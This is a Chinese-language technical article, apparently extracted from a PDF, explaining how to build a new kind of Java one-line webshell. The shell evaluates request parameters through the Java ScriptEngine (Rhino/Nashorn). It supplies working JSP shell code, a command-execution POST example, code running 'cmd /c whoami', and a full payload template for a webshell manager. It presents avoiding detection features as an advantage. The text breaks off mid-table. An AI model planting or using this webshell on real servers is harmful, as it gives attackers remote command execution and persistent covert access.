1
种新型Java句话⽊⻢的实现
前⾔
基本原理
获取脚本引擎
绑定对象
eval
基本语法
调⽤Java⽅法
导⼊Java类型
创建Java类型的数组
导⼊Java类
⽅法调⽤与重载
Payload结构设计
语法问题的坑
两种语⾔对象间的相互转换
Rhino/Nashorn解析的差异
反射的坑
保底操作
测试
最后
@yzddMr6
⼀直以来，Java⼀句话⽊⻢都是采⽤打⼊字节码defineClass实现的。这种⽅法的优势是可以完整的打
进去⼀个类，可以⼏乎实现Java上的所有功能。不⾜之处就是Payload过于巨⼤，并且不像脚本语⾔⼀
样⽅便修改。并且还存在很多特征，例如继承ClassLoader，反射调⽤defineClass等。本⼈在这⾥提出
⼀种新型Java⼀句话⽊⻢：利⽤Java中JS引擎实现的⼀句话⽊⻢。
前⾔
基本原理
2
1. Java没有eval函数，Js有eval函数，可以把字符串当代码解析。
2. Java从1.6开始⾃带ScriptEngineManager这个类，原⽣⽀持调⽤js，⽆需安装第三⽅库。
3. ScriptEngine⽀持在Js中调⽤Java的对象。
综上所述，我们可以利⽤Java调⽤JS引擎的eval，然后在Payload中反过来调⽤Java对象，这就是本⽂
提出的新型Java⼀句话的核⼼原理。
ScriptEngineManager全名javax.script.ScriptEngineManager，从Java 6开始⾃带。其中Java 6/7采
⽤的js解析引擎是Rhino，⽽从java8开始换成了Nashorn。不同解析引擎对同样的代码有⼀些差别，这
点后⾯有所体现。
如果说原理其实⼀两句话就可以说清楚，但是难点在于Payload的编写。跨语⾔调⽤最⼤的⼀个难点就
是数据类型以及⽅法的转换。例如Java中有byte数组，Js中没有怎么办？C++⾥有指针但是Java⾥没有
这个玩意怎么办？
在实现期间踩了很多的坑，这篇⽂章跟⼤家⼀起掰扯掰扯，希望能给⼤家提供点帮助。
或者通过eval的重载函数，直接把对象通过⼀个HashMap放进去
获取脚本引擎
Plain Text
复制代码
绑定对象
Plain Text
复制代码
//通过脚本名称获取：
ScriptEngine engine = new 
ScriptEngineManager().getEngineByName("JavaScript");  //简写为js也可以
//通过⽂件扩展名获取： 
ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");  
//通过MIME类型来获取： 
ScriptEngine engine = new 
ScriptEngineManager().getEngineByMimeType("text/javascript");  
1
2
3
4
5
6
ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
engine.put("request", request);
engine.put("response", response);
engine.eval(request.getParameter("mr6"));
1
2
3
4
3
综合上⾯两步，有很多种写法，例如：
shell.jsp
或者直接缩写成⼀句：
以执⾏命令为例：
POST：mr6=java.lang.Runtime.getRuntime().exec("calc");
Plain Text
复制代码
eval
Plain Text
复制代码
Plain Text
复制代码
new 
javax.script.ScriptEngineManager().getEngineByName("js").eval(request.getPara
meter("ant"), new javax.script.SimpleBindings(new java.util.HashMap() {{
put("response", response);
put("request", request);
}}))
1
2
3
4
1
2
3
4
5
6
7
8
1
2
3
4
5
6
4
即可达到命令执⾏的效果。
翻阅⽂档⽐较枯燥，这⾥挑⼀些⽤到的说⼀说。
感兴趣的同学也可以看⼀下原⽂档：https://docs.oracle.com/en/java/javase/12/scripting/java-
scripting-programmers-guide.pdf
前⾯加上全限定类名即可
基本语法
调⽤Java⽅法
Plain Text
复制代码
导⼊Java类型
var s = [3];
s[0] = "cmd";
s[1] = "/c";
s[2] = "whoami";//yzddmr6
var p = java.lang.Runtime.getRuntime().exec(s);
var sc = new java.util.Scanner(p.getInputStream(),"GBK").useDelimiter("\\A");
var result = sc.hasNext() ? sc.next() : "";
sc.close();
1
2
3
4
5
6
7
8
5
默认情况下，Nashorn 不会导⼊Java的包。这样主要为了避免类型冲突，⽐如你写了⼀个new String，
引擎怎么知道你new的是Java的String还是js的String？所以所有的Java的调⽤都需要加上全限定类名。
但是这样写起来很不⽅便。
这个时候⼤聪明Mozilla  Rhino 就想了⼀个办法，整了个扩展⽂件，⾥⾯提供了importClass 跟
importPackage ⽅法，可以导⼊指定的Java包。
importClass 导⼊指定Java的类，现在推荐⽤Java.type
importPackage 导⼊⼀个Java包，类似import com.yzddmr6.*，现在推荐⽤JavaImporter 
这⾥需要注意的是，Rhino对该语法的错误处理机制，当被访问的类存在时，Rhino加载该class，⽽当
其不存在时，则把它当成package名称，⽽并不会报错。
Plain Text
复制代码
创建Java类型的数组
Plain Text
复制代码
导⼊Java类
●
●
Plain Text
复制代码
var Vector = java.util.Vector;
var JFrame = Packages.javax.swing.JFrame;
 //这种写法仅仅⽀持Nashorn，Rhino并不⽀持
var Vector = Java.type("java.util.Vector")
var JFrame = Java.type("javax.swing.JFrame")
1
2
3
4
5
6
// Rhino
var Array = java.lang.reflect.Array
var intClass = java.lang.Integer.TYPE
var array = Array.newInstance(intClass, 8)
// Nashorn
var IntArray = Java.type("int[]")
var array = new IntArray(8)
1
2
3
4
5
6
7
8
load("nashorn:mozilla_compat.js");
importClass(java.util.HashSet);
var set = new HashSet();
importPackage(java.util);
var list = new ArrayList();
1
2
3
4
5
6
7
6
在⼀些特殊情况下，导⼊的全局包会影响js中的函数，例如类名冲突。这个时候可以⽤JavaImporter，
并配合with语句，对导⼊的Java包设定⼀个使⽤范围。
⽅法在JavaScript中实际上是对象的⼀个属性，所以除了使⽤ . 来调⽤⽅法之外，也可以使⽤[]来调⽤
⽅法：
Java⽀持重载（Overload）⽅法，例如，System.out 的 println 有多个重载版本，如果你想指定特定的
重载版本，可以使⽤[]指定参数类型。例如：
详情写在注释⾥了
Plain Text
复制代码
⽅法调⽤与重载
Plain Text
复制代码
Plain Text
复制代码
Payload结构设计
// create JavaImporter with specific packages and classes to import
var SwingGui = new JavaImporter(javax.swing,
                            javax.swing.event,
                            javax.swing.border,
                            java.awt.event);
with (SwingGui) {
    // 在with⾥⾯才可以调⽤swing⾥⾯的类，防⽌污染
    var mybutton = new JButton("test");
    var myframe = new JFrame("test");
}
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
var System = Java.type('java.lang.System');
System.out.println('Hello, World');    // Hello, World
System.out['println']('Hello, World'); // Hello, World
1
2
3
var System = Java.type('java.lang.System');
System.out['println'](3.14);          // 3.14
System.out['println(double)'](3.14);  // 3.14
System.out['println(int)'](3.14);     // 3
1
2
3
4
7
Plain Text
复制代码
//导⼊基础拓展
try {
  load("nashorn:mozilla_compat.js");
} catch (e) {}
//导⼊常⻅包
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.java.io);
var output = new StringBuffer(""); //输出
var cs = "${jspencode}"; //设置字符集编码
var tag_s = "${tag_s}"; //开始符号
var tag_e = "${tag_e}"; //结束符号
try {
  response.setContentType("text/html");
  request.setCharacterEncoding(cs);
  response.setCharacterEncoding(cs);
  function decode(str) {
    //参数解码
    str = str.substr(2);
    var bt = Base64DecodeToByte(str);
    return new java.lang.String(bt, cs);
  }
  function Base64DecodeToByte(str) {
    importPackage(Packages.sun.misc);
    importPackage(Packages.java.util);
    var bt;
    try {
      bt = new BASE64Decoder().decodeBuffer(str);
    } catch (e) {
      bt = Base64.getDecoder().decode(str);
    }
    return bt;
  }
  function asoutput(str) {
    //回显加密
    return str;
  }
  function func(z1) {
    //eval function
    return z1;
  }
  output.append(func(z1)); //添加功能函数回显
} catch (e) {
  output.append("ERROR:// " + e.toString()); //输出错误
}
try {
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
8
要注意的是，在遇到Java跟JS可能存在类型冲突的地⽅，即使导⼊了包也要加上全限定类名。
在编写payload的时候被坑了很久的⼀个问题就是，在导⼊java.lang以后写new String(bt,cs)没有加全
限定类名，导致打印出来的⼀直是⼀个字符串地址。
正确的操作是new java.lang.String(bt,cs)。因为在Java和Js中均存在String类，按照优先级，直接new
出来的会是Js的对象。
下⾯附上类型对⽐表：
语法问题的坑
两种语⾔对象间的相互转换
  response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e); //
回显
} catch (e) {}
49
50
9
这也是当时⼀个坑点，看下⾯⼀段代码
Rhino/Nashorn解析的差异
JavaScript Value
JavaScript Type
Java Type
Is Scriptable
Is Function
{a:1, b:['x','y']}
object
org.mozilla.javas
cript.NativeObje
ct
+
-
[1,2,3]
object
org.mozilla.javas
cript.NativeArray
+
-
1
number
java.lang.Double
-
-
1.2345
number
java.lang.Double
-
-
NaN
number